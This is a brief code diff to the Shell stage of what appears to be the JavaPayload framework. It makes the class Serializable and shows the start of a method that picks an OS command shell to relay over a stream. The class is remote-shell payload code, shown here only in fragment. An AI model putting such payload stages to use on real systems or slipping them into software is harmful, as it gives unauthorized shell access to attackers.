@@ -36,8 +36,9 @@ package javapayload.stage;
 
 import java.io.DataInputStream;
 import java.io.OutputStream;
+import java.io.Serializable;
 
-public class Shell implements Stage {
+public class Shell implements Stage, Serializable {
     public void start(DataInputStream in, OutputStream out, String[] parameters) throws Exception {
         final String[] cmdarray = new String[1];
         if (System.getProperty("os.name").toLowerCase().indexOf("windows") != -1) {
